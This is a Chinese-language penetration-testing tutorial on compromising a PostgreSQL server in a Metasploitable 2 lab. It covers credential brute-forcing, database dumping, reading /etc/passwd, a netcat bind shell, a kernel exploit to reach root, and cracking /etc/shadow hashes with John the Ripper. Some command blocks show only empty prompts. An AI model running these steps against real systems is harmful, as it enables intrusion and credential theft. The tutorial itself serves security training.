## 	Postgresql 渗透经验



**一、前言**



PostgreSQL 是一个开源数据库，主要部署于 Linux 操作系统中。然而，PostgreSQL 的兼容性非常好，可以兼容多个操作系统，也能在 Windows 及 MacOS 操作系统上运行。如果 PostgreSQL 数据库没有被正确配置，并且攻击者已经事先获取了凭证信息，那么他们就可以实施各类攻击行为，比如读写系统文件以及执行任意代码等。



我之所以写这篇文章，目的在于为渗透测试人员提供测试 PostgreSQL 数据库的具体方法。文章中用来演示的目标系统是 Metasploitable 2，因为该系统包含许多漏洞，也存在配置不当问题。



**二、服务探测及版本识别**



PostgreSQL 数据库的默认监听端口为 5432。在端口扫描过程中，如果发现该端口开放，那么目标主机很有可能安装了 PostgreSQL。



```

nmap -sV 192.168.100.11 -p 5432



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t019bd8999d8023865a.png)](https://p3.ssl.qhimg.com/t019bd8999d8023865a.png)



图 1. PostgreSQL：通过 Nmap 判断数据库版本



此外，Metasploit 平台中也有一个模块可以用来识别 PostgreSQL 数据库以及具体的版本：



auxiliary/scanner/postgres/postgres_version



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t0131cedb1f28fc1282.png)](https://p2.ssl.qhimg.com/t0131cedb1f28fc1282.png)



图 2. PostgreSQL：通过 Metasploit 识别数据库版本



**三、探测数据库凭证**



在共享文件夹中发现包含数据库用户名及密码的配置文件并不稀奇，然而，如果目标没有犯下如此低级的失误，那么我们可以使用一个 Metasploit 模块暴力破解数据库凭证，如下图所示：



```

auxiliary/scanner/postgres/postgres_login



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t017bc797b2b9542574.png)](https://p1.ssl.qhimg.com/t017bc797b2b9542574.png)



图 3. PostgreSQL：暴力破解数据库凭证



探测数据库凭证是非常关键的一个步骤，如果没有掌握正确的凭证，我们很难突破目标主机，因为大多数攻击操作都需要访问数据库。



**四、访问数据库**



Kali Linux 系统中默认包含了 psql 工具，在已知数据库用户名及密码的前提下，我们可以使用这个工具通过 PostgreSQL 数据的认证过程。命令如下：



```

psql -h 192.168.100.11 -U postgres



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01585d53555f1542c9.png)](https://p1.ssl.qhimg.com/t01585d53555f1542c9.png)



图 4. PostgreSQL：访问数据库



一旦连接上数据库，我们应该执行如下操作：



1、枚举已有的数据库。



2、枚举数据库用户。



3、枚举数据库表。



4、读取表内容。



5、读取数据库密码。



6、导出数据库内容。



我们可以使用如下命令完成上述任务：



```

postgres-

postgres-

template1=

template1=

postgres-

pg_dump --host=192.168.100.11 --username=postgres --password --dbname=template1 --table='users' -f output_pgdump



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01dd3caa3f334f1ffd.png)](https://p1.ssl.qhimg.com/t01dd3caa3f334f1ffd.png)



图 5. PostgreSQL：枚举已有的数据库



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01cdf574f87ec66763.png)](https://p2.ssl.qhimg.com/t01cdf574f87ec66763.png)



图 6. PostgreSQL：枚举数据库用户



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01d4d80433f9ed306f.png)](https://p2.ssl.qhimg.com/t01d4d80433f9ed306f.png)



图 7. PostgreSQL：枚举已有表



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t0132e237bdf54b8a1c.png)](https://p4.ssl.qhimg.com/t0132e237bdf54b8a1c.png)



图 8. PostgreSQL：读取表内容



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01b945d883e647578c.png)](https://p5.ssl.qhimg.com/t01b945d883e647578c.png)



图 9. PostgreSQL：读取数据库密码



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t017f09b0b132574020.png)](https://p4.ssl.qhimg.com/t017f09b0b132574020.png)



图 10. PostgreSQL：导出数据库内容



我们也可以使用 Metasploit 完成上述部分任务。命令如下：



```

auxiliary/admin/postgres/postgres_sql

auxiliary/scanner/postgres/postgres_hashdump



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01b1c1764952aad87d.png)](https://p1.ssl.qhimg.com/t01b1c1764952aad87d.png)



图 11. PostgreSQL：使用 Metasploit 枚举数据库



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01bbf01a591708f41c.png)](https://p5.ssl.qhimg.com/t01bbf01a591708f41c.png)



图 12. 使用 Metasploit 读取 Postgres 服务器哈希



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01b067dface462532d.png)](https://p2.ssl.qhimg.com/t01b067dface462532d.png)



图 13. 使用 Metasploit 执行 PostgreSQL 命令



**五、命令执行**



PostgreSQL 数据库能够与底层系统交互，这样数据库管理员就能执行各种数据库命令，同时也能从系统中读取输出结果。



```

postgres=# select pg_ls_dir('./');



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01c8c8da8767f58b1c.png)](https://p3.ssl.qhimg.com/t01c8c8da8767f58b1c.png)



图 14. PostgreSQL：读取系统目录结构



执行如下命令，我们就能读取服务端的 postgres 文件。



```

postgres=# select pg_read_file('PG_VERSION', 0, 200);



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01c1906747e0da0d69.png)](https://p1.ssl.qhimg.com/t01c1906747e0da0d69.png)



图 15. PostgreSQL：读取服务端文件



我们也可以创建一个数据表，以便存储及查看目标主机中已有的某个文件。命令如下：



```

postgres-# CREATE TABLE temp(t TEXT);

postgres-# COPY temp FROM '/etc/passwd';

postgres-# SELECT * FROM temp limit 1 offset 0;



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t012105e5a9a9fae2e2.png)](https://p2.ssl.qhimg.com/t012105e5a9a9fae2e2.png)



图 16. PostgreSQL：读取本地文件



Metasploit 框架中有个模块，可以自动化读取本地文件，命令如下：



```

auxiliary/admin/postgres/postgres_readfile



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t0144452b7a8c29eefc.png)](https://p1.ssl.qhimg.com/t0144452b7a8c29eefc.png)



图 17. PostgreSQL：通过 Metasploit 读取本地文件



除了读取文件内容外，我们也可以使用 PostgreSQL 往目标主机中写入文件，比如我们可以写入 bash 文件，用来监听某个随机端口：



```

postgres=

postgres=

postgres=

postgres=



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01a474ee302faffc5c.png)](https://p1.ssl.qhimg.com/t01a474ee302faffc5c.png)



图 18. PostgreSQL：将文件写入目标主机



当然我们需要赋予该文件可执行权限：



```

chmod +x pentestlab

./pentestlab



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t0122da3c40a49f2812.png)](https://p2.ssl.qhimg.com/t0122da3c40a49f2812.png)



图 19. 启动本地监听器



使用 Netcat 成功建立连接：



```

nc -vn 192.168.100.11 2346

python -c "import pty;pty.spawn('/bin/bash')"



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t011389936e63c867c2.png)](https://p5.ssl.qhimg.com/t011389936e63c867c2.png)



图 20. PostgreSQL：连接到后门



如果 postgres 服务账户具备 / tmp 目录的写入权限，那么我们可以通过用户自定义函数（UDF，user defined functions）实现任意代码执行。



```

exploit/linux/postgres/postgres_payload



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01e92cee2d758990be.png)](https://p2.ssl.qhimg.com/t01e92cee2d758990be.png)



图 21. PostgreSQL：代码执行



**六、权限提升**



如果我们通过已获取的数据库凭证或其他方法获得对目标主机的访问权限，那么接下来我们应当尝试将已有权限提升至 root 权限。当然，我们在 Linux 系统中可以有各种方法实现权限提升，并且这也是比较复杂的一个过程，但为了不偏离本文的主题，我们使用某个内核漏洞完成权限提升任务。



尽可能完整地获取内核版本以及操作系统的全部信息有助于我们发现系统存在哪些漏洞，命令如下：



```

user@metasploitable:/

uname -a

Linux metasploitable 2.6.24-16-server 



```



根据上述内核版本信息，我们可以在 exploitdb 中搜索对应版本是否存在本地漏洞利用代码，这也是目前最为简单的一种方法。



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01ccfa0a19e8c3b8cd.png)](https://p0.ssl.qhimg.com/t01ccfa0a19e8c3b8cd.png)



图 22. 搜索 Linux 内核漏洞利用代码



我们可以在本地或者远程系统中编译这段[利用代码](https://www.exploit-db.com/exploits/8572/)。



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t0106b04e97f4935e3e.png)](https://p5.ssl.qhimg.com/t0106b04e97f4935e3e.png)



图 23. 编译漏洞利用程序并获取 netlink 的 PID 信息



这个漏洞利用程序需要在 / tmp 目录中创建一个 run 文件。当漏洞利用代码执行时就会运行这个文件，我们可以通过该文件监听某个端口。



```

#!/bin/bash

nc -lvvp 2345 -e /bin/bash



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01d1c1fec197564db1.png)](https://p3.ssl.qhimg.com/t01d1c1fec197564db1.png)



图 24. 在 tmp 目录中创建 run 文件



需要赋予该文件可执行权限。



```

chmod +x /tmp/run



```



我们可以通过如下命令，建立与该端口的连接，然后获得 root 权限下的 python shell 接口。



```bash

nc -vn 192.168.100.11 2345

python -c "import pty;pty.spawn('/bin/bash')"

```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01423ff4f7f324a925.png)](https://p1.ssl.qhimg.com/t01423ff4f7f324a925.png)



图 25. 通过 Netcat 与目标主机建立连接



我们可以使用 Metasploit 平台自动完成上述过程。因此当我们发现目标主机存在某个漏洞时，我们可以尝试在 Metasploit 中搜索是否有个匹配的模块可以使用：



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t012f3707b374d5c691.png)](https://p2.ssl.qhimg.com/t012f3707b374d5c691.png)



图 26. 利用 Metasploit 实现 Linux 系统权限提升



当漏洞利用代码执行时，我们可以得到另一个具备 root 用户权限的 Meterpreter 会话：



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t0164b994a9561afd26.png)](https://p5.ssl.qhimg.com/t0164b994a9561afd26.png)



图 27. root 权限下的 Meterpreter 会话



即使我们已经获得了 root 访问权限，我们最好还是从 shadow 文件中读取所有用户的密码哈希，以便后续破解这些哈希值。通过这些哈希值，渗透测试人员可以发现存在弱口令的账户，也很有可能借助其中某些账户访问同一网络中的其他系统。



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t018fe6b66af08a0f6b.png)](https://p5.ssl.qhimg.com/t018fe6b66af08a0f6b.png)



图 28. 检查 Shadow 文件



我们可以将密码哈希值保存到一个文本文件中，然后使用 John the Ripper 工具破解这些哈希：



```

john /root/Desktop/password.txt

john --show /root/Desktop/password.txt



```



[![](/Users/seven/Desktop/pocs/database/postgresql/postgresql渗透技巧.assets/t01c349b07ab31729dd.png)](https://p3.ssl.qhimg.com/t01c349b07ab31729dd.png)



图 29. 被破解的哈希值



上述命令可以显示已被成功破解的密码哈希值。



现在，这个 Linux 系统中的所有账户已被我们破解，我们可以使用这些账户访问其他系统。